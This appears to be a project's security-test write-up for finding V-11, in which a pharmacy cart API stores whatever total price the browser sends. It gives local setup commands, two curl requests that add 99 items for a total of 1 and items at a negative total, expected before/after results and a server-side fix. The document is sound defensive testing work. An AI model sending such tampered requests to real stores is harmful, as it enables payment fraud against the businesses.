# V-11 — The client decides the price and the server stores it

**Finding:** the cart never looks the price up. Whatever `totalPrice` the browser
sends is saved as-is, so a patient can buy 99 items for a total of 1 — or even a
negative total. OWASP A06:2025 (Insecure Design), CWE-602.
📍 [UserCart.controller.js](../../backend/src/controllers/UserCart.controller.js),
[payment.controller.js](../../backend/src/controllers/payment.controller.js)

## Setup

```bash
# Terminal 1 — start the disposable server (in-memory DB, seeded, localhost only)
cd backend && npm run dev:test

# Terminal 2 — from the repo root, load the values the dev server wrote
tok() { node -p "const t=require('./security-tests/.tokens.json'); $1"; }
BASE=$(tok "t.baseUrl")
DANA=$(tok "t.accounts.dana.cookie"); DANA_ID=$(tok "t.accounts.dana.id")
MED1=$(tok "t.ids.medicineId")
MED_NEG=$(node -p "require('crypto').randomBytes(12).toString('hex')")  # any distinct medicine row
```

> The search/discount endpoints can't be used to list medicines here: the dev
> server sets `sanitizeFilter=true` (mirroring V-07), which turns their `$regex`
> query into a CastError. Read the one seeded medicine with `/medicines/get/:id`.

## Attacks

### Step 1 — the real price, from the server's own catalogue
```bash
curl -s "$BASE/api/v1/medicines/get/$MED1"
```
Note the `"price"` (101 for the seeded `Testomycin 001`). The honest total for 99
of them is `99 × 101 = 9999`.

### Attack 1 — send a total of 1 for 99 items
```bash
curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" \
  -H "Cookie: $DANA" -H "Content-Type: application/json" \
  -d "{\"userId\":\"$DANA_ID\",\"medicineId\":\"$MED1\",\"quantity\":99,\"totalPrice\":1,\"status\":\"Pending\"}"
```

### Attack 2 — send a negative total (-500)
```bash
curl -s -i -X POST "$BASE/api/v1/medicines-cart/add-to-cart" \
  -H "Cookie: $DANA" -H "Content-Type: application/json" \
  -d "{\"userId\":\"$DANA_ID\",\"medicineId\":\"$MED_NEG\",\"quantity\":2,\"totalPrice\":-500,\"status\":\"Pending\"}"
```

`/payment/checkout` is **not** called — it crashes the whole server (V-06), so the
payment side is shown from the source only.

## Expected result

| | Before the fix | After the fix |
|---|---|---|
| Attack 1 | `HTTP 201`, stored `totalPrice: 1` (honest total 9999) | server recalculates `price × quantity`; the client total is ignored |
| Attack 2 | `HTTP 201`, stored `totalPrice: -500` | negative/invalid total rejected (e.g. `HTTP 400`) |

## How to fix

Recalculate `totalPrice = Medicine.price × quantity` on the server from the
`Medicine` collection and ignore whatever the client sent; reject non-positive
quantities. Re-validate the amount against the Razorpay order at verification time.

## Re-run for "after" evidence

Check out the fix branch, restart the dev server (the attacks change the seed),
then:
```bash
node security-tests/capture-v11-v15.mjs --after   # writes after.txt
bash security-tests/curl-v11-v15.sh --after       # writes after-curl.txt
```
